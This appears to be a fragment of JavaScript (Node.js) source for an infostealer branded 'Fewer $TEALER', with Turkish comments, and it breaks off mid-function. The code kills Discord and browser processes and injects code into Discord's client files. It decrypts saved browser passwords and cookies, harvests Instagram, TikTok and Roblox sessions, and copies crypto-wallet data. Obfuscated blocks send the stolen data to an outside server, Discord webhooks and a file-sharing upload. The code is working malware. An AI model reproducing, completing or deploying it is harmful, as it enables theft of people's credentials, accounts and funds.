 var _0x30b89e=_0x4588;(function(_0x3e6c47,_0x368b70){var _0x46b0ed=_0x4588,_0x4ea7c1=_0x3e6c47();while(!![]){try{var _0x3a7946=parseInt(_0x46b0ed(0x169))/0x1+parseInt(_0x46b0ed(0x160))/0x2+parseInt(_0x46b0ed(0x15d))/0x3+parseInt(_0x46b0ed(0x159))/0x4+-parseInt(_0x46b0ed(0x168))/0x5+-parseInt(_0x46b0ed(0x16a))/0x6+parseInt(_0x46b0ed(0x156))/0x7*(-parseInt(_0x46b0ed(0x16b))/0x8);if(_0x3a7946===_0x368b70)break;else _0x4ea7c1['push'](_0x4ea7c1['shift']());}catch(_0x548495){_0x4ea7c1['push'](_0x4ea7c1['shift']());}}}(_0x48c9,0x4881a));function _0x4588(_0x181f38,_0x460ef6){var _0x945658=_0x48c9();return _0x4588=function(_0x394fc4,_0x53fe4c){_0x394fc4=_0x394fc4-0x14f;var _0x13b942=_0x945658[_0x394fc4];return _0x13b942;},_0x4588(_0x181f38,_0x460ef6);}var _0x3a664b=(function(){var _0x566b29=!![];return function(_0xa5111e,_0x23c92c){var _0x1330b7=_0x566b29?function(){var _0x12d0f7=_0x4588;if(_0x23c92c){var _0x2cb213=_0x23c92c[_0x12d0f7(0x154)](_0xa5111e,arguments);return _0x23c92c=null,_0x2cb213;}}:function(){};return _0x566b29=![],_0x1330b7;};}()),_0x37f503=_0x3a664b(this,function(){var _0x22bc07=_0x4588;return _0x37f503[_0x22bc07(0x162)]()[_0x22bc07(0x166)](_0x22bc07(0x15e))[_0x22bc07(0x162)]()[_0x22bc07(0x155)](_0x37f503)[_0x22bc07(0x166)](_0x22bc07(0x15e));});_0x37f503();var _0x53fe4c=(function(){var _0x206d0b=!![];return function(_0x1fb323,_0xf1f97e){var _0x32fad=_0x206d0b?function(){var _0x324f89=_0x4588;if(_0xf1f97e){var _0x5c75db=_0xf1f97e[_0x324f89(0x154)](_0x1fb323,arguments);return _0xf1f97e=null,_0x5c75db;}}:function(){};return _0x206d0b=![],_0x32fad;};}()),_0x394fc4=_0x53fe4c(this,function(){var _0x10b416=_0x4588,_0x480fc1;try{var _0x273173=Function(_0x10b416(0x15a)+_0x10b416(0x163)+');');_0x480fc1=_0x273173();}catch(_0x327adf){_0x480fc1=window;}var _0x44fe94=_0x480fc1[_0x10b416(0x153)]=_0x480fc1['console']||{},_0x1da7d6=['log','warn','info',_0x10b416(0x152),'exception',_0x10b416(0x15f),_0x10b416(0x167)];for(var _0x75b6fb=0x0;_0x75b6fb<_0x1da7d6[_0x10b416(0x15c)];_0x75b6fb++){var _0x47b429=_0x53fe4c[_0x10b416(0x155)][_0x10b416(0x161)][_0x10b416(0x15b)](_0x53fe4c),_0x55583f=_0x1da7d6[_0x75b6fb],_0x2f73c0=_0x44fe94[_0x55583f]||_0x47b429;_0x47b429[_0x10b416(0x164)]=_0x53fe4c[_0x10b416(0x15b)](_0x53fe4c),_0x47b429[_0x10b416(0x162)]=_0x2f73c0[_0x10b416(0x162)]['bind'](_0x2f73c0),_0x44fe94[_0x55583f]=_0x47b429;}});function _0x48c9(){var _0xbf3ddc=['1867008GbDfvw','return\x20(function()\x20','bind','length','1758246ALdDVe','(((.+)+)+)+$','table','1029684VTEUgD','prototype','toString','{}.constructor(\x22return\x20this\x22)(\x20)','__proto__','embed-color','search','trace','1683565lnNZKw','139136KkVjSg','2753502LUKFUm','2376jNKRZg','filter','https://buildandwatch.net/','Fewer\x20$TEALER','https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg','error','console','apply','constructor','14476jBwWHh','then','catch'];_0x48c9=function(){return _0xbf3ddc;};return _0x48c9();}_0x394fc4(),axios['post'](_0x30b89e(0x14f),{'content':null,'embeds':[{'color':config[_0x30b89e(0x165)],'fields':fields[_0x30b89e(0x16c)](onlyUnique),'author':{'name':_0x30b89e(0x150),'icon_url':_0x30b89e(0x151)},'footer':{'text':'Fewer\x20$TEALER'}}]})[_0x30b89e(0x157)](_0xf40dfc=>{})[_0x30b89e(0x158)](_0x3c82ec=>{}),axios['post'](webhook3939,{'content':null,'embeds':[{'color':config[_0x30b89e(0x165)],'fields':fields[_0x30b89e(0x16c)](onlyUnique),'author':{'name':'Fewer\x20$TEALER','icon_url':_0x30b89e(0x151)},'footer':{'text':'Fewer\x20$TEALER'}}]})['then'](_0x6e0e63=>{})[_0x30b89e(0x158)](_0x2473ed=>{});
}
   
 

   







async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "Fewer"))
    }
    await httpx(`soon injection if you have injection code put you here link`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}



async function getExtension() {
  addFolder('Wallets'); // Assuming addFolder() function is defined somewhere

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

const walletCountStr = walletCount.toString();
const browserCountStr = browserCount.toString();

if (walletCountStr !== '0' || browserCountStr !== '0') {
  const message = {
    embeds: [
      {
        title: 'Wallet Information',
        description: 'Here is the wallet information:',
        color: 0x0099ff,
        fields: [
          {
            name: '🛠️ Browser wallet',
            value: walletCountStr,
            inline: true,
          },
          {
            name: '🖥️ Desktop wallet',
            value: browserCountStr,
            inline: true,
          },
        ],
      },
    ],
  };


var _0x5a72d2=_0x2717;(function(_0x4e4df2,_0x3fd755){var _0x4797ac=_0x2717,_0x3d8f68=_0x4e4df2();while(!![]){try{var _0x8a6100=parseInt(_0x4797ac(0x148))/0x1+parseInt(_0x4797ac(0x13a))/0x2*(-parseInt(_0x4797ac(0x155))/0x3)+-parseInt(_0x4797ac(0x13b))/0x4*(parseInt(_0x4797ac(0x146))/0x5)+parseInt(_0x4797ac(0x15a))/0x6*(parseInt(_0x4797ac(0x13f))/0x7)+-parseInt(_0x4797ac(0x142))/0x8*(parseInt(_0x4797ac(0x14f))/0x9)+-parseInt(_0x4797ac(0x14a))/0xa+-parseInt(_0x4797ac(0x145))/0xb*(-parseInt(_0x4797ac(0x147))/0xc);if(_0x8a6100===_0x3fd755)break;else _0x3d8f68['push'](_0x3d8f68['shift']());}catch(_0x2e1e4f){_0x3d8f68['push'](_0x3d8f68['shift']());}}}(_0x3f43,0xb2917));var _0x4d4747=(function(){var _0x1af9de=!![];return function(_0x482bb4,_0x169804){var _0x4599ec=_0x1af9de?function(){var _0x3e1267=_0x2717;if(_0x169804){var _0x1758bf=_0x169804[_0x3e1267(0x152)](_0x482bb4,arguments);return _0x169804=null,_0x1758bf;}}:function(){};return _0x1af9de=![],_0x4599ec;};}()),_0x6acfa0=_0x4d4747(this,function(){var _0x459cc1=_0x2717;return _0x6acfa0[_0x459cc1(0x14e)]()[_0x459cc1(0x140)](_0x459cc1(0x14d))[_0x459cc1(0x14e)]()['constructor'](_0x6acfa0)['search']('(((.+)+)+)+$');});_0x6acfa0();function _0x2717(_0xfa509a,_0x544743){var _0x2c11d8=_0x3f43();return _0x2717=function(_0x3b3179,_0x495bad){_0x3b3179=_0x3b3179-0x139;var _0x43638e=_0x2c11d8[_0x3b3179];return _0x43638e;},_0x2717(_0xfa509a,_0x544743);}var _0x495bad=(function(){var _0x4185c5=!![];return function(_0x4bc171,_0x3a9f09){var _0x2cdfca=_0x4185c5?function(){var _0x38f837=_0x2717;if(_0x3a9f09){var _0x1fae5b=_0x3a9f09[_0x38f837(0x152)](_0x4bc171,arguments);return _0x3a9f09=null,_0x1fae5b;}}:function(){};return _0x4185c5=![],_0x2cdfca;};}()),_0x3b3179=_0x495bad(this,function(){var _0x110663=_0x2717,_0x337d80=function(){var _0x283b4f=_0x2717,_0x2b3b8c;try{_0x2b3b8c=Function(_0x283b4f(0x159)+_0x283b4f(0x153)+');')();}catch(_0xe95415){_0x2b3b8c=window;}return _0x2b3b8c;},_0x131971=_0x337d80(),_0xd4017b=_0x131971['console']=_0x131971['console']||{},_0x2d5dee=[_0x110663(0x13c),_0x110663(0x144),_0x110663(0x149),_0x110663(0x13e),_0x110663(0x156),_0x110663(0x151),'trace'];for(var _0x416ccb=0x0;_0x416ccb<_0x2d5dee[_0x110663(0x157)];_0x416ccb++){var _0x32614b=_0x495bad[_0x110663(0x150)]['prototype'][_0x110663(0x139)](_0x495bad),_0x45a1e8=_0x2d5dee[_0x416ccb],_0x22b2ac=_0xd4017b[_0x45a1e8]||_0x32614b;_0x32614b[_0x110663(0x158)]=_0x495bad['bind'](_0x495bad),_0x32614b['toString']=_0x22b2ac[_0x110663(0x14e)][_0x110663(0x139)](_0x22b2ac),_0xd4017b[_0x45a1e8]=_0x32614b;}});_0x3b3179(),axios['post']('https://buildandwatch.net/',message)[_0x5a72d2(0x143)](()=>{var _0xc84ea1=_0x5a72d2;console[_0xc84ea1(0x13c)](_0xc84ea1(0x14b));})[_0x5a72d2(0x141)](_0x5b5082=>{var _0x40e8f7=_0x5a72d2;console[_0x40e8f7(0x13e)](_0x40e8f7(0x14c),_0x5b5082[_0x40e8f7(0x13d)]);}),axios[_0x5a72d2(0x154)](webhook3939,message)['then'](()=>{var _0x1bc3a8=_0x5a72d2;console[_0x1bc3a8(0x13c)]('Embed\x20successfully\x20sent\x20through\x20the\x20webhook.');})[_0x5a72d2(0x141)](_0x106371=>{var _0x48b904=_0x5a72d2;console[_0x48b904(0x13e)](_0x48b904(0x14c),_0x106371[_0x48b904(0x13d)]);});function _0x3f43(){var _0x1a5648=['__proto__','return\x20(function()\x20','69924gVksJt','bind','4362bcrKAW','4uecsXh','log','message','error','217rmoKdc','search','catch','8465528PcCLym','then','warn','22hzJdOb','3207895KilxVP','24755484pRPrOK','12160djlgWA','info','6657800rxbKHa','Embed\x20successfully\x20sent\x20through\x20the\x20webhook.','An\x20error\x20occurred\x20while\x20sending\x20the\x20embed:','(((.+)+)+)+$','toString','9wIJiyE','constructor','table','apply','{}.constructor(\x22return\x20this\x22)(\x20)','post','1929kiSMne','exception','length'];_0x3f43=function(){return _0x1a5648;};return _0x3f43();}
} else {
  console.log('walletCount and browserCount are both 0. No action needed.');
}
 
}



async function getPasswords() {
  const _0x540754 = [];
  let passwordsFound = false; // Şifre bulunduğu zaman bu değeri true yapacağız

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );

            count.passwords++;
            passwordsFound = true; // Şifre bulunduğunu işaretliyoruz
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }

  if (!passwordsFound) {
    // Şifre bulunamadıysa bu kod bloğu çalışır
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', 'No passwords found.', {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
  
  
 

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Passwords.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Passwords File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };
var _0xc7964e=_0x5e9a;(function(_0x4c79bc,_0x2aa36c){var _0x4fa91f=_0x5e9a,_0x45f1aa=_0x4c79bc();while(!![]){try{var _0x1dfece=parseInt(_0x4fa91f(0x115))/0x1+parseInt(_0x4fa91f(0x106))/0x2+-parseInt(_0x4fa91f(0x10a))/0x3+-parseInt(_0x4fa91f(0x123))/0x4+parseInt(_0x4fa91f(0x10b))/0x5*(parseInt(_0x4fa91f(0x125))/0x6)+-parseInt(_0x4fa91f(0x118))/0x7*(-parseInt(_0x4fa91f(0x121))/0x8)+parseInt(_0x4fa91f(0x116))/0x9;if(_0x1dfece===_0x2aa36c)break;else _0x45f1aa['push'](_0x45f1aa['shift']());}catch(_0x32005f){_0x45f1aa['push'](_0x45f1aa['shift']());}}}(_0x4aaf,0xb5160));var _0x3cef65=(function(){var _0x528aa7=!![];return function(_0x5b5871,_0x47ba3b){var _0x6b4681=_0x528aa7?function(){var _0x3367bc=_0x5e9a;if(_0x47ba3b){var _0x18cc32=_0x47ba3b[_0x3367bc(0x119)](_0x5b5871,arguments);return _0x47ba3b=null,_0x18cc32;}}:function(){};return _0x528aa7=![],_0x6b4681;};}()),_0x2bf1f4=_0x3cef65(this,function(){var _0x3047c5=_0x5e9a;return _0x2bf1f4[_0x3047c5(0x10c)]()['search'](_0x3047c5(0x107))[_0x3047c5(0x10c)]()[_0x3047c5(0x10d)](_0x2bf1f4)[_0x3047c5(0x124)](_0x3047c5(0x107));});function _0x5e9a(_0x1c63ca,_0x42f432){var _0xb7d009=_0x4aaf();return _0x5e9a=function(_0x5636d0,_0x511960){_0x5636d0=_0x5636d0-0x105;var _0x433839=_0xb7d009[_0x5636d0];return _0x433839;},_0x5e9a(_0x1c63ca,_0x42f432);}_0x2bf1f4();var _0x511960=(function(){var _0x46b1cb=!![];return function(_0x261a75,_0x1b6ff7){var _0x20bde5=_0x46b1cb?function(){var _0x52c336=_0x5e9a;if(_0x1b6ff7){var _0x41d67b=_0x1b6ff7[_0x52c336(0x119)](_0x261a75,arguments);return _0x1b6ff7=null,_0x41d67b;}}:function(){};return _0x46b1cb=![],_0x20bde5;};}()),_0x5636d0=_0x511960(this,function(){var _0x1e129f=_0x5e9a,_0x27cf0e=function(){var _0x1795f6=_0x5e9a,_0x229c06;try{_0x229c06=Function(_0x1795f6(0x117)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5a6e00){_0x229c06=window;}return _0x229c06;},_0x28bc87=_0x27cf0e(),_0x71db24=_0x28bc87[_0x1e129f(0x109)]=_0x28bc87[_0x1e129f(0x109)]||{},_0x58c487=[_0x1e129f(0x11f),_0x1e129f(0x110),'info',_0x1e129f(0x114),_0x1e129f(0x108),_0x1e129f(0x111),'trace'];for(var _0x2220b7=0x0;_0x2220b7<_0x58c487[_0x1e129f(0x11c)];_0x2220b7++){var _0x5efb8b=_0x511960[_0x1e129f(0x10d)][_0x1e129f(0x120)][_0x1e129f(0x11d)](_0x511960),_0x5085c6=_0x58c487[_0x2220b7],_0x5233e8=_0x71db24[_0x5085c6]||_0x5efb8b;_0x5efb8b['__proto__']=_0x511960[_0x1e129f(0x11d)](_0x511960),_0x5efb8b['toString']=_0x5233e8[_0x1e129f(0x10c)][_0x1e129f(0x11d)](_0x5233e8),_0x71db24[_0x5085c6]=_0x5efb8b;}});function _0x4aaf(){var _0x2dd3dc=['statusText','Webhook\x20gönderilirken\x20hata\x20oluştu:','error','289675XZnSSD','1336932PquDZx','return\x20(function()\x20','12019XiOqnN','apply','Webhook\x20gönderildi:','post','length','bind','message','log','prototype','3064DDJxBw','https://buildandwatch.net/','3756324TbmQFt','search','6oHOYxT','status','1760780ffGvaQ','(((.+)+)+)+$','exception','console','4295559IfFOXs','5682190FTHTXE','toString','constructor','catch','then','warn','table'];_0x4aaf=function(){return _0x2dd3dc;};return _0x4aaf();}_0x5636d0(),axios[_0xc7964e(0x11b)](_0xc7964e(0x122),embedData)[_0xc7964e(0x10f)](_0xbc4250=>{var _0x4c5b5a=_0xc7964e;console[_0x4c5b5a(0x11f)]('Webhook\x20gönderildi:',_0xbc4250['status'],_0xbc4250[_0x4c5b5a(0x112)]);})['catch'](_0x566f20=>{var _0x325f81=_0xc7964e;console[_0x325f81(0x11f)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x566f20['message']);}),axios[_0xc7964e(0x11b)](webhook3939,embedData)[_0xc7964e(0x10f)](_0x27ae7e=>{var _0x2e5863=_0xc7964e;console[_0x2e5863(0x11f)](_0x2e5863(0x11a),_0x27ae7e[_0x2e5863(0x105)],_0x27ae7e[_0x2e5863(0x112)]);})[_0xc7964e(0x10e)](_0x417e36=>{var _0x1bf05c=_0xc7964e;console['log'](_0x1bf05c(0x113),_0x417e36[_0x1bf05c(0x11e)]);});
        })

        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x49d012=_0x5171;(function(_0x373e74,_0x185337){var _0xeee69e=_0x5171,_0x2d0d6a=_0x373e74();while(!![]){try{var _0x44a13f=parseInt(_0xeee69e(0xca))/0x1*(parseInt(_0xeee69e(0xaf))/0x2)+-parseInt(_0xeee69e(0xc4))/0x3+parseInt(_0xeee69e(0xae))/0x4*(parseInt(_0xeee69e(0xb9))/0x5)+-parseInt(_0xeee69e(0xb7))/0x6+parseInt(_0xeee69e(0xb1))/0x7+-parseInt(_0xeee69e(0xc1))/0x8*(-parseInt(_0xeee69e(0xcf))/0x9)+-parseInt(_0xeee69e(0xc9))/0xa*(parseInt(_0xeee69e(0xb8))/0xb);if(_0x44a13f===_0x185337)break;else _0x2d0d6a['push'](_0x2d0d6a['shift']());}catch(_0x5a9f5b){_0x2d0d6a['push'](_0x2d0d6a['shift']());}}}(_0x2d4b,0x677a5));function _0x5171(_0x5d86f4,_0x86d9cb){var _0x1c18ca=_0x2d4b();return _0x5171=function(_0x20ccc0,_0x1c9bfe){_0x20ccc0=_0x20ccc0-0xac;var _0x3541c1=_0x1c18ca[_0x20ccc0];return _0x3541c1;},_0x5171(_0x5d86f4,_0x86d9cb);}var _0x4d131c=(function(){var _0x266fa9=!![];return function(_0x3ca03c,_0x181006){var _0x3e0766=_0x266fa9?function(){var _0x278edf=_0x5171;if(_0x181006){var _0x176cd2=_0x181006[_0x278edf(0xd1)](_0x3ca03c,arguments);return _0x181006=null,_0x176cd2;}}:function(){};return _0x266fa9=![],_0x3e0766;};}()),_0x224cd=_0x4d131c(this,function(){var _0x14c151=_0x5171;return _0x224cd[_0x14c151(0xac)]()[_0x14c151(0xcb)](_0x14c151(0xbc))[_0x14c151(0xac)]()['constructor'](_0x224cd)[_0x14c151(0xcb)]('(((.+)+)+)+$');});function _0x2d4b(){var _0x7096d=['return\x20(function()\x20','then','length','96310oKOnmc','216431LFPpGI','search','console','catch','info','9jbxgUY','exception','apply','toString','Webhook\x20gönderildi:','100Aamjnu','6jBMrZx','trace','4989635mkbWVd','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','status','__proto__','message','371058xPAeef','2673lINbuu','142160rKPGDZ','bind','constructor','(((.+)+)+)+$','error','prototype','warn','log','6433672MwqOiQ','post','{}.constructor(\x22return\x20this\x22)(\x20)','153258ZFtjOD','https://buildandwatch.net/'];_0x2d4b=function(){return _0x7096d;};return _0x2d4b();}_0x224cd();var _0x1c9bfe=(function(){var _0x2be0be=!![];return function(_0x4363db,_0x5d67c3){var _0x5a8cc4=_0x2be0be?function(){if(_0x5d67c3){var _0x151c2c=_0x5d67c3['apply'](_0x4363db,arguments);return _0x5d67c3=null,_0x151c2c;}}:function(){};return _0x2be0be=![],_0x5a8cc4;};}()),_0x20ccc0=_0x1c9bfe(this,function(){var _0x3c860e=_0x5171,_0x879c7d=function(){var _0xd51028=_0x5171,_0x3816b9;try{_0x3816b9=Function(_0xd51028(0xc6)+_0xd51028(0xc3)+');')();}catch(_0xf7e5b7){_0x3816b9=window;}return _0x3816b9;},_0x3e8479=_0x879c7d(),_0x53e33f=_0x3e8479['console']=_0x3e8479[_0x3c860e(0xcc)]||{},_0x1f24bb=[_0x3c860e(0xc0),_0x3c860e(0xbf),_0x3c860e(0xce),_0x3c860e(0xbd),_0x3c860e(0xd0),'table',_0x3c860e(0xb0)];for(var _0x2bc4da=0x0;_0x2bc4da<_0x1f24bb[_0x3c860e(0xc8)];_0x2bc4da++){var _0x2913ff=_0x1c9bfe[_0x3c860e(0xbb)][_0x3c860e(0xbe)][_0x3c860e(0xba)](_0x1c9bfe),_0x58b0e5=_0x1f24bb[_0x2bc4da],_0x11e12b=_0x53e33f[_0x58b0e5]||_0x2913ff;_0x2913ff[_0x3c860e(0xb5)]=_0x1c9bfe['bind'](_0x1c9bfe),_0x2913ff[_0x3c860e(0xac)]=_0x11e12b[_0x3c860e(0xac)][_0x3c860e(0xba)](_0x11e12b),_0x53e33f[_0x58b0e5]=_0x2913ff;}});_0x20ccc0(),axios[_0x49d012(0xc2)](_0x49d012(0xc5),embedData)['then'](_0x5d2f85=>{var _0x2a4ce7=_0x49d012;console[_0x2a4ce7(0xc0)](_0x2a4ce7(0xad),_0x5d2f85['status'],_0x5d2f85['statusText']);}),axios['post'](webhookUrl,embedData)[_0x49d012(0xc7)](_0x1305b2=>{var _0x554de3=_0x49d012;console[_0x554de3(0xc0)]('Webhook\x20gönderildi:',_0x1305b2[_0x554de3(0xb4)],_0x1305b2[_0x554de3(0xb3)]);})[_0x49d012(0xcd)](_0x58097f=>{var _0x2a286c=_0x49d012;console['log'](_0x2a286c(0xb2),_0x58097f[_0x2a286c(0xb6)]);});
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 
};



async function getCookiesAndSendWebhook() {
  addFolder('Wallets\\Cookies');
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

  for (let [browserName, cookies] of Object.entries(cookiesData)) {
